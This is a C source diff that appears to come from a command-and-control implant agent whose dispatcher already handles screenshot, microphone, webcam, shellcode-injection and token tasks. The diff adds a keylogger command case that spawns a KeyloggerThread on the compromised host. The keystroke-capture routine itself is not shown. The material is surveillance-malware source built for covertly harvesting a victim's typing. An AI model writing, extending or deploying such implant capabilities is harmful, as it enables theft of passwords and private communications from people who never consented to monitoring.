@@ -13,6 +13,7 @@
 #include "Tasks/Screenshot.h"
 #include "Tasks/Microphone.h"
 #include "Tasks/Webcamshot.h"
+#include "Tasks/Keylogger.h"
 #include "Tasks/InlineExecute.h"
 #include "Tasks/InjectShellcode.h"
 #include "Tasks/Token.h"
@@ -224,6 +225,41 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
 
             //HostInfo(taskUuid, taskParser);
             //return;
+        }
+#endif
+#ifdef INCLUDE_CMD_KEYLOGGER
+        case KEYLOGGER_CMD:
+        {
+            _dbg("KEYLOGGER_CMD was called");
+
+            TASK_PARAMETER* tp = (TASK_PARAMETER*)LocalAlloc(LPTR, sizeof(TASK_PARAMETER));
+            if (!tp)
+            {
+                _err("Failed to allocate memory for task parameter.");
+                return;
+            }
+
+            tp->TaskParser = (PPARSER)LocalAlloc(LPTR, sizeof(PARSER));
+            if (!tp->TaskParser) {
+                _err("Failed to allocate memory for TaskParser.");
+                free(tp->TaskUuid);
+                LocalFree(tp);
+                return;
+            }
+
+            tp->TaskUuid = _strdup(taskUuid);
+            ParserNew(tp->TaskParser, taskParser->Buffer, taskParser->Length);
+
+            HANDLE hThread = CreateThread(NULL, 0, KeyloggerThread, (LPVOID)tp, 0, NULL);
+            if (!hThread) {
+                _err("Failed to create keylogger thread");
+                free(tp->TaskUuid);
+                ParserDestroy(tp->TaskParser);
+                LocalFree(tp);
+            } else {
+                CloseHandle(hThread);
+            }
+            return;
         }
 #endif
 #ifdef INCLUDE_CMD_DOWNLOAD
